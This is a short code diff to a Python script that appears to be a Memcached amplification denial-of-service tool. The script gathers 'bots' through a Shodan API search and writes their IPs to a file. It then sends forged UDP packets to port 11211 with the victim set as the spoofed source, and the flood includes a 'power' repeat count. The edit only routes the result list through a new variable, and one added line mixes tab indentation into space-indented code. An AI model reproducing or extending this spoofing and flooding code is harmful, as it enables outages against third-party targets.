@@ -33,10 +33,11 @@ while True:
             print('[✓] API Key Authentication: SUCCESS')
             print('[~] Number of bots: %s' % results['total'])
             print('')
+	    ebat = results['total']
             saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
             if saveresult.startswith('y'):
                 file2 = open('./bots.txt', 'a')
-                for result in results['total']:
+                for result in ebat:
                     file2.write(result['ip_str'] + "\n")
                 print('[~] File written: ./bots.txt')
                 print('')
@@ -90,7 +91,7 @@ while True:
                             with suppress_stdout():
                                 send(IP(src=target, dst='%s' % i) / UDP(dport=11211)/Raw(load=data), count=power)
                 else:
-                    for result in results['total']:
+                    for result in ebat:
                         if power>1:
                             print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                             with suppress_stdout():
